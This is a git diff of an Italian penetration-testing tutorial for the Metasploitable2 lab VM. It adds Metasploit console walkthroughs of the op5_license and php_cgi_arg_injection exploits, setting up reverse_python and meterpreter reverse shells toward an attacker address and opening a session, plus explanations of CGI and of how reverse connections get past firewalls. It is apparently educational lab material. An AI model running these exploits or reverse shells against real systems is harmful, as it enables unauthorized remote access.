@@ -1,6 +1,4 @@
-L'HyperText Transfer Protocol (HTTP) è un protocollo a livello applicativo usato per la trasmissione d'informazioni sul web. Un server HTTP generalmente resta in ascolto delle richieste dei client sulla porta 80 usando il protocollo TCP a livello di trasporto; mentre sulla porta 443 si usa il più ben noto HTTP, la differenza sta nell'uso di un protocollo di crittografia attraverso TLS.
-
-Gli attacchi a questo protocollo sono i più disparati vanno dal bypass dell'autenticazione dal lato client, fino al XSS (cross site scripting).
+# PHP
 
 Vedremo adesso come sarebbe possibile accedere alla macchina metasploitable2 attraverso varie strade:
 La più semplice consiste nel fare proprio il footprinting del servizio, quindi per prima cosa colleghiamoci ad esso attraverso un browser
@@ -66,14 +64,80 @@ Matching Modules
 Interact with a module by name or index. For example info 2, use 2 or use exploit/windows/http/php_apache_request_headers_bof
 ```
 
-Abbiamo non uno ma ben tre exploit disponibili, di cui due con una classificazione __Excellent__ concentramoci su questi. Il primo __exploit/multi/http/op5_license__ ci permette di eseguire comandi da remoto come root sulla macchina targhet, il nostro compito è quindi mandare un payload da far eseguire per garantirci una shell sulla macchina.
+Abbiamo non uno ma ben tre exploit disponibili, di cui due con una classificazione __Excellent__ concentramoci su questi. 
 
---__DEVO CAPIRE UN ATTIMO STA PARTE PERCHé NON L'HO SCRITTA BENE ma a quanto pare di default usa il payload php/meterpreter/reverse_tcp nello specifico un reverse_tcp permette di aprire una connessione ma dal target a me, in questo modo un firewall non blocca niente__
+## op5_license 
+
+Il primo __exploit/multi/http/op5_license__ ci permette di eseguire comandi da remoto come root sulla macchina targhet, il nostro compito è quindi mandare un payload da far eseguire per garantirci una shell sulla macchina. Il payload selezionato di default è __php/meterpreter/reverse_tcp__ il quale cerca di iniettare un payload per permettere una "reverse connection" che è usata per superare le impostazioni dei firewall, noi cerceremo di aprire una reverse shell creata tramite python. Un firewall hardware generalmente blocca il traffico in arrivo su tutte le porte non imponendo invece alcun tipo di restrizione sul traffico in uscita. Meterpreter è un payload estensibile dinamicamente tramite injection in memoria di moduli detti stagers, per approfondimenti si rimanda alla spiegazione nella sezione __postgreSQL__.
+
+```
+msf6 > use 0
+msf6 exploit(multi/http/op5_license) > show options
+
+Module options (exploit/multi/http/op5_license):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT    443              yes       The target port (TCP)
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   URI      /license.php     yes       The full URI path to license.php
+   VHOST                     no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+msf6 exploit(multi/http/op5_license) > set rhosts 192.168.139.129
+rhosts => 192.168.139.129
+
+msf6 exploit(multi/http/op5_license) > show payloads
+
+Compatible Payloads
+===================
+
+   #  Name                                 Disclosure Date  Rank    Check  Description
+   -  ----                                 ---------------  ----    -----  -----------
+   0  payload/cmd/unix/bind_perl                            normal  No     Unix Command Shell, Bind TCP (via Perl)
+   1  payload/cmd/unix/bind_perl_ipv6                       normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
+   2  payload/cmd/unix/bind_ruby                            normal  No     Unix Command Shell, Bind TCP (via Ruby)
+   3  payload/cmd/unix/bind_ruby_ipv6                       normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6
+   4  payload/cmd/unix/reverse_perl                         normal  No     Unix Command Shell, Reverse TCP (via Perl)
+   5  payload/cmd/unix/reverse_perl_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
+   6  payload/cmd/unix/reverse_python                       normal  No     Unix Command Shell, Reverse TCP (via Python)
+   7  payload/cmd/unix/reverse_python_ssl                   normal  No     Unix Command Shell, Reverse TCP SSL (via python)
+   8  payload/cmd/unix/reverse_ruby                         normal  No     Unix Command Shell, Reverse TCP (via Ruby)
+   9  payload/cmd/unix/reverse_ruby_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)
+   
+msf6 exploit(multi/http/op5_license) > set payload 6
+payload => cmd/unix/reverse_python
+msf6 exploit(multi/http/op5_license) > set Lhost 192.168.139.128
+Lhost => 192.168.139.128
+msf6 exploit(multi/http/op5_license) > run
+
+[*] Started reverse TCP handler on 192.168.139.128:4444 
+[*] Sending request to https://192.168.139.129:443/license.php
+[-] No response from the server
+[*] Exploit completed, but no session was created.
+```
+
+Che cosa è successo? L'exploit è completato ma nessuna sessione è stata creata. Quello che è successo è, fortunatamente, l'unico errore che può avere questo exploit ovvero il server non risponde e questo potrebbe essere perché la macchina target non riesce ad interpretare python oppure potrebbe non avere la porta richiesta aperta.
+
+## php_cgi_arg_injection
 
 Mentre la seconda opzione __exploit/multi/http/php_cgi_arg_injection__ ci informa sulla vulnerabiltià di argument injection. Nello specifico questo modulo sfrutta il flag __-d__ per impostare l'esecuzione di codice nella pagina php.ini.
 
-__--Sono arrivato qui ed ho pure fatto l'exploit, solo che non sono sicuro di aver avuto accesso all'altra macchina ma penso più alla mia .-. LOL cmq devo capire un attimos /129 è la target 128 sono io__
+Ma prima una piccola nota su che cos'è CGI, contrariamente alla sigla comune che si rifà alla computer grafica qui si intende __Common Gateway Interface__ ed è una tecnologia standard usata dai web server per interfacciarsi con applicazioni esterne generando contenuti web dinamici. Il CGI viene implementato lato server e quando ad un web server arriva la richiesta di un documento CGI il server esegue il programma  e al termine invia al web browser l'output del programma. Il file CGI è un semplice programma già compilato (codice oggetto) e la directory predefinita degli script CGI è /cgi-bin/, anche se a volte è preferibile modificarla, per evitare i frequenti attacchi dai bot sui file in quella cartella.
+
+Quindi se otteniamo l'accesso ad un server compromesso possimo permettere l'esecuzione di script .cgi e caricare una reverse shell la quale ci permette di aprire un'interfaccia verso il target.
+
 ```
+msf6 > use 1
+
 msf6 exploit(multi/http/php_cgi_arg_injection) > set lhost 192.168.139.128
 lhost => 192.168.139.128
 msf6 exploit(multi/http/php_cgi_arg_injection) > set rhost 192.168.139.129
@@ -90,5 +154,4 @@ Usage: sessions <id>
 Interact with a different session Id.
 This works the same as calling this from the MSF shell: sessions -i <session id>
 ```
-
-
+Abbiamo aperto una sessione, ma perché meterpreter non ci permette di usare nessun comando classico come: ls, whoami, etc. Semplicemente non possiamo perché abbiamo istanziato un payload reverse_tcp e in questo momento stiamo visitando la macchina target come se fosse un vero e proprio sito. Il multi/handler, è una porzione di codice utilizzata per simulare il comportamento di funzionalità software che gestisce gli exploit al di fuori del framework metasploit, si aspetta una connessione da un payload meterpreter non da un web browser. 
